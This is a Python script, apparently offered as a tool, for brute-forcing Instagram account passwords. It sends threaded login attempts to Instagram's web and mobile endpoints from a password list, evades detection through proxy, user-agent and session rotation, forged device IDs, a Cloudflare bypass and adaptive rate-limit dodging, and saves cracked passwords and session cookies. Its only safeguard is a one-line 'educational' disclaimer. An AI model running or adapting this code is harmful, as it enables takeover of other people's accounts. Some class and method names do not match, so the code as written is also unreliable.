# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Instagram Brute Force Script
A script for brute force attacks on Instagram accounts.
"""

import os
import sys
import time
import random
import requests
import json
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor
import socket
import urllib3
import itertools
import base64
import hashlib
from urllib.parse import quote
import ssl
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from fake_useragent import UserAgent
import cloudscraper
import asyncio
import aiohttp
import asyncssh


class AdvancedInstagramBruteForcer:
    """Advanced Instagram Brute Force Attack Class - Industrial Grade"""

    def __init__(self, target_username, password_list, proxy_list=None, use_tor=False):
        self.target_username = target_username
        self.password_list = password_list
        self.proxy_list = self.load_proxies() if not proxy_list else proxy_list
        self.found_password = None
        self.use_tor = use_tor
        self.rate_limit_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.checkpoint_count = 0
        
        # Advanced session management
        self.sessions = []
        self.session_pool_size = 50
        self.create_session_pool()
        
        # User agent rotation
        try:
            self.ua = UserAgent()
        except:
            self.ua = None
            
        self.mobile_agents = [
            'Instagram 274.0.0.18.75 Android (29/10; 420dpi; 1080x2280; Xiaomi; Mi 9T; davinci; qcom; ru_RU; 436384447)',
            'Instagram 274.0.0.18.75 Android (28/9; 320dpi; 720x1520; samsung; SM-A750F; a7y18lte; exynos7885; en_US; 436384447)',
            'Instagram 274.0.0.18.75 Android (30/11; 560dpi; 1440x3040; samsung; SM-G973F; beyond1; exynos9820; en_US; 436384447)',
            'Instagram 274.0.0.18.75 Android (29/10; 480dpi; 1080x2340; OnePlus; GM1903; OnePlus7; qcom; en_US; 436384447)',
            'Instagram 274.0.0.18.75 Android (28/9; 480dpi; 1080x2160; Huawei; ANE-LX1; HWANE; kirin710; en_US; 436384447)'
        ]
        
        self.web_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/118.0',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'
        ]
        
        # Advanced attack patterns
        self.attack_modes = ['web', 'mobile_api', 'hybrid']
        self.current_mode = 'hybrid'
        
        # Smart rate limiting
        self.min_delay = 0.5
        self.max_delay = 3.0
        self.adaptive_delay = 1.0
        
        # Stealth features
        self.use_cloudflare_bypass = True
        self.use_residential_proxies = True
        self.rotate_sessions = True

    def get_advanced_headers(self, mode='web'):
        """Generate advanced headers with fingerprint evasion"""
        base_headers = {
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.9',
                'es-ES,es;q=0.9',
                'fr-FR,fr;q=0.9',
                'de-DE,de;q=0.9'
            ]),
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        }
        
        if mode == 'mobile_api':
            # Instagram mobile app headers
            headers = {
                'User-Agent': random.choice(self.mobile_agents),
                'X-IG-App-ID': '124024574287414',
                'X-IG-Android-ID': self.generate_android_id(),
                'X-IG-Device-ID': self.generate_device_id(),
                'X-IG-Family-Device-ID': self.generate_device_id(),
                'X-Mid': self.generate_mid(),
                'Accept': '*/*',
                'Accept-Language': 'en-US',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }
        else:
            # Web headers
            headers = base_headers.copy()
            if self.ua:
                try:
                    headers['User-Agent'] = self.ua.random
                except:
                    headers['User-Agent'] = random.choice(self.web_agents)
            else:
                headers['User-Agent'] = random.choice(self.web_agents)
                
        return headers

    def generate_android_id(self):
        """Generate realistic Android ID"""
        return 'android-' + ''.join(random.choices('0123456789abcdef', k=16))

    def generate_device_id(self):
        """Generate realistic device ID"""
        return str(random.randint(10**20, 10**21 - 1))

    def generate_mid(self):
        """Generate machine ID"""
        return base64.b64encode(os.urandom(16)).decode().replace('=', '').replace('+', '-').replace('/', '_')

    def get_csrf_token(self, session, mode='web'):
        """Get CSRF token with multiple fallback methods"""
        try:
            headers = self.get_advanced_headers(mode)
            proxies = self.get_proxy()
            
            if mode == 'mobile_api':
                # Try mobile API endpoint
                response = session.get(
                    'https://i.instagram.com/api/v1/si/fetch_headers/',
                    headers=headers,
                    proxies=proxies,
                    timeout=15
                )
                if response.status_code == 200:
                    return response.headers.get('X-CSRFToken')
            
            # Fallback to web method
            response = session.get(
                'https://www.instagram.com/accounts/login/',
                headers=headers,
                proxies=proxies,
                timeout=15
            )
            
            # Multiple extraction methods
            csrf_methods = [
                lambda text: text.split('"csrf_token":"')[1].split('"')[0] if '"csrf_token":"' in text else None,
                lambda text: text.split('csrftoken=')[1].split(';')[0] if 'csrftoken=' in text else None,
                lambda text: text.split('"token":"')[1].split('"')[0] if '"token":"' in text else None
            ]
            
            for method in csrf_methods:
                try:
                    token = method(response.text)
                    if token:
                        return token
                except:
                    continue
                    
            # Extract from cookies
            csrf_cookie = session.cookies.get('csrftoken')
            if csrf_cookie:
                return csrf_cookie
                
        except Exception as e:
            print(f"⚠️  CSRF token error: {e}")
        return None

    def attempt_login_advanced(self, password, attempt_number=0):
        """Advanced login attempt with multiple attack vectors"""
        session = self.get_session()
        
        # Adaptive attack mode selection
        if attempt_number % 3 == 0:
            mode = 'mobile_api'
        elif attempt_number % 3 == 1:
            mode = 'web'
        else:
            mode = 'hybrid'
        
        try:
            # Smart delay with adaptive adjustment
            delay = random.uniform(self.min_delay, self.max_delay) + self.adaptive_delay
            time.sleep(delay)
            
            # Get CSRF token
            csrf_token = self.get_csrf_token(session, mode)
            if not csrf_token:
                print(f"⚠️  No CSRF token for {password}")
                return False

            # Prepare login data based on mode
            if mode == 'mobile_api':
                success = self.mobile_api_login(session, password, csrf_token)
            else:
                success = self.web_login(session, password, csrf_token)
            
            if success is None:
                # Rate limited - increase delay
                self.adaptive_delay = min(self.adaptive_delay * 1.5, 10.0)
                self.rate_limit_count += 1
                print(f"⏳ Rate limited! Adaptive delay: {self.adaptive_delay:.1f}s")
                return False
            elif success:
                self.found_password = password
                self.success_count += 1
                return True
            else:
                self.failed_count += 1
                # Reduce delay on successful request
                self.adaptive_delay = max(self.adaptive_delay * 0.95, self.min_delay)
                return False
                
        except Exception as e:
            print(f"💥 Critical error with {password}: {e}")
            return False

    def mobile_api_login(self, session, password, csrf_token):
        """Mobile API login attempt"""
        headers = self.get_advanced_headers('mobile_api')
        headers['X-CSRFToken'] = csrf_token
        
        # Generate realistic mobile login data
        login_data = {
            'username': self.target_username,
            'password': password,
            'device_id': self.generate_android_id(),
            'login_attempt_account_recovery_allowed': 'true',
            '_uuid': self.generate_device_id(),
            'phone_id': self.generate_device_id(),
            '_csrftoken': csrf_token,
            'login_attempt_count': str(random.randint(0, 2))
        }
        
        # Encode data like Instagram mobile app
        signed_body = self.generate_signed_body(login_data)
        
        try:
            response = session.post(
                'https://i.instagram.com/api/v1/accounts/login/',
                data=signed_body,
                headers=headers,
                proxies=self.get_proxy(),
                timeout=20
            )
            
            return self.analyze_response(response, password, 'mobile')
            
        except Exception as e:
            print(f"📱 Mobile API error: {e}")
            return False

    def web_login(self, session, password, csrf_token):
        """Web login attempt"""
        headers = self.get_advanced_headers('web')
        headers.update({
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded'
        })

        login_data = {
            'username': self.target_username,
            'password': password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }

        try:
            response = session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                proxies=self.get_proxy(),
                timeout=20
            )
            
            return self.analyze_response(response, password, 'web')
            
        except Exception as e:
            print(f"🌐 Web error: {e}")
            return False

    def generate_signed_body(self, data):
        """Generate signed body for mobile API (simplified)"""
        json_data = json.dumps(data)
        return f'signed_body={quote(json_data)}&ig_sig_key_version=4'

    def analyze_response(self, response, password, method):
        """Analyze login response with advanced detection"""
        status_code = response.status_code
        text = response.text.lower()
        
        # Success indicators
        success_indicators = [
            'authenticated',
            '"status":"ok"',
            'logged_in_user',
            'sessionid'
        ]
        
        # Rate limit indicators
        rate_limit_indicators = [
            'rate_limited',
            'please wait',
            'too many requests',
            'spam',
            'try again later'
        ]
        
        # Checkpoint indicators
        checkpoint_indicators = [
            'checkpoint_required',
            'challenge_required',
            'two_factor_required',
            'verification'
        ]
        
        # Check for success
        if any(indicator in text for indicator in success_indicators):
            print(f"🎯 [{method.upper()}] SUCCESS! Password: {password}")
            self.save_success(password, method, response)
            return True
            
        # Check for rate limiting
        if status_code == 429 or any(indicator in text for indicator in rate_limit_indicators):
            print(f"⏳ [{method.upper()}] Rate limited for: {password}")
            return None
            
        # Check for checkpoint
        if any(indicator in text for indicator in checkpoint_indicators):
            print(f"🔒 [{method.upper()}] Checkpoint for: {password}")
            self.checkpoint_count += 1
            self.save_checkpoint(password, method, response)
            return False
            
        # Regular failure
        print(f"❌ [{method.upper()}] Failed: {password}")
        return False

    def save_success(self, password, method, response):
        """Save successful login details"""
        success_data = {
            'username': self.target_username,
            'password': password,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'cookies': dict(response.cookies),
            'response_headers': dict(response.headers)
        }
        
        os.makedirs('logs', exist_ok=True)
        with open(f'logs/success_{self.target_username}.json', 'w') as f:
            json.dump(success_data, f, indent=2)

    def save_checkpoint(self, password, method, response):
        """Save checkpoint details for manual bypass"""
        checkpoint_data = {
            'username': self.target_username,
            'password': password,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'response_text': response.text[:1000]  # First 1000 chars
        }
        
        os.makedirs('logs', exist_ok=True)
        with open(f'logs/checkpoints_{self.target_username}.json', 'a') as f:
            f.write(json.dumps(checkpoint_data) + '\n')

    def brute_force_attack(self, max_threads=3):
        """Execute brute force attack with threading"""
        print(f"🎯 Starting brute force attack on: {self.target_username}")
        print(f"🔢 Total passwords to try: {len(self.password_list)}")
        print(f"🧵 Using {max_threads} threads")
        print("=" * 50)

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for password in self.password_list:
                if self.found_password:
                    break
                future = executor.submit(self.attempt_login, password)
                futures.append(future)

            for future in futures:
                if self.found_password:
                    break
                future.result()

        if self.found_password:
            print(f"\n🎉 ATTACK SUCCESSFUL!")
            print(f"👤 Username: {self.target_username}")
            print(f"🔑 Password: {self.found_password}")
            return True
        else:
            print(f"\n💔 Attack failed. No valid password found.")
            return False

    def load_proxies(self):
        """Load proxies from multiple sources"""
        proxies = []
        proxy_sources = [
            'proxy_list.txt',
            '../proxy_list.txt',
            'config/proxies.json',
            'free_configs/proxies.txt'
        ]
        
        for source in proxy_sources:
            try:
                if source.endswith('.json'):
                    with open(source, 'r') as f:
                        data = json.load(f)
                        proxies.extend(data.get('proxies', []))
                else:
                    with open(source, 'r') as f:
                        proxies.extend([line.strip() for line in f if line.strip()])
            except:
                continue
                
        # Add some free proxy APIs
        try:
            free_proxies = self.fetch_free_proxies()
            proxies.extend(free_proxies)
        except:
            pass
            
        return list(set(proxies))  # Remove duplicates

    def fetch_free_proxies(self):
        """Fetch free proxies from public APIs"""
        proxies = []
        try:
            # ProxyList API
            response = requests.get('https://www.proxy-list.download/api/v1/get?type=http', timeout=10)
            if response.status_code == 200:
                proxies.extend(response.text.strip().split('\n'))
        except:
            pass
        return proxies

    def create_session_pool(self):
        """Create a pool of sessions for rotation"""
        for i in range(self.session_pool_size):
            session = self.create_advanced_session()
            self.sessions.append(session)

    def create_advanced_session(self):
        """Create an advanced session with stealth features"""
        if self.use_cloudflare_bypass:
            session = cloudscraper.create_scraper(
                browser={
                    'browser': 'chrome',
                    'platform': random.choice(['android', 'ios', 'windows']),
                    'mobile': random.choice([True, False])
                }
            )
        else:
            session = requests.Session()
        
        # Advanced retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Disable SSL warnings
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        session.verify = False
        
        return session

    def get_session(self):
        """Get a random session from pool"""
        if self.rotate_sessions and self.sessions:
            return random.choice(self.sessions)
        return self.sessions[0] if self.sessions else requests.Session()

    def get_proxy(self):
        """Get a random proxy"""
        if self.proxy_list:
            proxy = random.choice(self.proxy_list)
            if '://' not in proxy:
                proxy = f'http://{proxy}'
            return {'http': proxy, 'https': proxy}
        return None


def load_password_list(file_path):
    """Load password list from file"""
    passwords = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                password = line.strip()
                if password:
                    passwords.append(password)
        print(f"📋 Loaded {len(passwords)} passwords from {file_path}")
        return passwords
    except Exception as e:
        print(f"❌ Error loading password list: {e}")
        return []


def main():
    """Main function"""
    print("🔴 Instagram Brute Force Tool")
    print("⚠️  WARNING: This tool is for educational purposes only!")
    print("=" * 50)

    # Configuration
    target_username = input("👤 Enter target username: ").strip()
    if not target_username:
        print("❌ Username is required!")
        return

    password_file = input(
        "📋 Enter password list file path (default: ../passwords.txt): ").strip()
    if not password_file:
        password_file = "../passwords.txt"

    # Load passwords
    passwords = load_password_list(password_file)
    if not passwords:
        print("❌ No passwords loaded. Exiting.")
        return

    # Create brute forcer instance
    brute_forcer = InstagramBruteForcer(target_username, passwords)

    # Start attack
    try:
        brute_forcer.brute_force_attack(max_threads=2)
    except KeyboardInterrupt:
        print("\n⚠️  Attack interrupted by user.")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")


if __name__ == "__main__":
    main()
